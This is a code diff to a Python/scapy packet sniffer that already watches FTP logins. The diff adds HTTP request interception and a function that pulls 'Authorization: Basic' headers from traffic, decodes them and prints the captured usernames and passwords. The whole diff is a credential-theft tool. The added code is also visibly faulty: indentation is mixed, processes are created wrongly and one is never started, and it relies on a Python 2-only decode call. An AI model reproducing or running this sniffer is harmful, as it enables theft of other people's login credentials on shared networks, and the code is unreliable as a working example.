@@ -2,12 +2,38 @@ import sys
 from logging import getLogger, ERROR
 getLogger('scapy.runtime').setLevel(ERROR)
 from scapy.all import *
-
+from scapy.all import IP, sniff
+from scapy.layers import http
+from multiprocessing import Process
 
 interface = sys.argv[1]
 
 usernames = ['']
 passwords = ['']
+
+
+def auth_basic(pkt):
+    tcp = pkt.getlayer('TCP')
+    reg=re.search(r"Authorization: Basic(.*)", str(tcp))
+    if reg != None:
+        #print(reg.group(1))
+        name,passw = ((reg.group(1)).decode('base64')).split(':')
+        print("Username %r, password: %r" % (name,passw))
+
+
+def process_intercept(origin, dsthost, dstpath, dstmethod):
+    print ("*"*69)
+    print ('\n{0} just requested a {1} {2}{3}'.format(origin, dstmethod, dsthost, dstpath))
+
+
+def process_tcp_packet(pkt):
+    if not pkt.haslayer(http.HTTPRequest):
+        return
+    http_layer = pkt.getlayer(http.HTTPRequest)
+    ip_layer = pkt.getlayer(IP)
+    process_intercept(ip_layer.fields['src'], http_layer.fields['Host'], http_layer.fields['Path'], http_layer.fields['Method'])
+    print ("[+] HTTP sent to %s : %s" % (pkt.payload.dst, http_layer[1]))
+
 
 
 def check_login(pkt, username, password):
@@ -25,6 +51,10 @@ def check_for_ftp(pkt):
 	if pkt.haslayer(TCP) and pkt.haslayer(Raw):
 		if pkt[TCP].dport == 21 or pkt[TCP].sport == 21:
 			return True
+		if pkt[TCP].dport == 80:
+			p1=Process(target = process_tcp_packet(pkt))
+            p1.start()
+            p2=Process(target = auth_basic(pkt))
 		else:
 			return False
 	else:
